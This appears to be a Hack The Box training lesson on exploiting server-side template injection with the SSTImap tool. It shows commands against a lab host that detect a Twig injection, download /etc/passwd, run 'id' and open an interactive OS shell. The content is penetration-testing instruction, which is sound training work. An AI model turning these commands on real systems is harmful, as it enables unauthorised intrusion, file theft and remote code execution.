## Tools of the Trade

```sh
3kjS@htb[/htb]$ git clone https://github.com/vladko312/SSTImap

3kjS@htb[/htb]$ cd SSTImap

3kjS@htb[/htb]$ pip3 install -r requirements.txt

3kjS@htb[/htb]$ python3 sstimap.py
```

To automatically identify any SSTI vulnerabilities, as well as the template engine used by the web application, we need to provide SSTImap with the target URL:

```sh
3kjS@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test

<SNIP>

[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

As we can see, SSTImap confirms the SSTI vulnerability and successfully identifies the `Twig` template engine. It also provides capabilities we can use during exploitation. For instance, we can download a remote file to our local machine using the `-D` flag:

```sh
3kjS@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'

<SNIP>

[+] File downloaded correctly
```

Additionally, we can execute a system command using the `-S` flag:

```sh
3kjS@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id 

<SNIP> 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Alternatively, we can use `--os-shell` to obtain an interactive shell:

```sh
3kjS@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

<SNIP>

[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```
